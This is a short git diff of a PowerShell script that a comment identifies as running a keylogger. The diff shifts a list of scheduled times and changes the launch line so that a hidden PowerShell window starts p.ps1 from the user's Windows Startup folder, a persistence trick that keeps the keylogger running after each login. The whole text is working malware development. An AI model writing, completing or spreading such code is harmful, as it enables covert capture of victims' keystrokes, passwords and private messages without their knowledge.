@@ -2,13 +2,13 @@
 $logTimes = @(
     '00:00:00',
     '10:40:00',
-    '00:45:00',
-    '00:50:00',
-    '00:55:00',
-    '00:00:00',
-    '00:05:00',
-    '00:10:00',
-    '00:15:00',
+    '10:45:00',
+    '10:50:00',
+    '10:55:00',
+    '11:00:00',
+    '11:05:00',
+    '11:10:00',
+    '11:15:00',
     '01:00:00',
     '02:00:00',
     '03:00:00',
@@ -54,7 +54,7 @@ while ($true) {
             }
   
             # runs keylogger
-            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+            powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/p.ps1"
         }
     }
 }
